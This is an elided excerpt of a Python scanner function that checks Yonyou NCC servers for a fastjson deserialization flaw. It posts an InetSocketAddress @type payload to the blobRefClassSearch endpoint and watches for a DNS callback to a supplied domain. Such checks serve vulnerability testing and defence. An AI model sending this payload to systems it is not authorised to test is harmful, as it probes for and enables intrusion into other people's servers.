...
def check(url):
    url = url.rstrip("/")
    taeget_url = urljoin(url, "/ncchr/pm/ref/indiIssued/blobRefClassSearch")
    try:
        headers = {
        ...
        data = """{"clientParam":"{\\\"x\\\":{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"111111.%s\\\"}}}"}"""%(domain)
        ...
        for i in range(0, 3):
            ...
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}:YongYouNCC_blobRefClassSearch_fastjsonDeserialization!\033[0m")
                return True
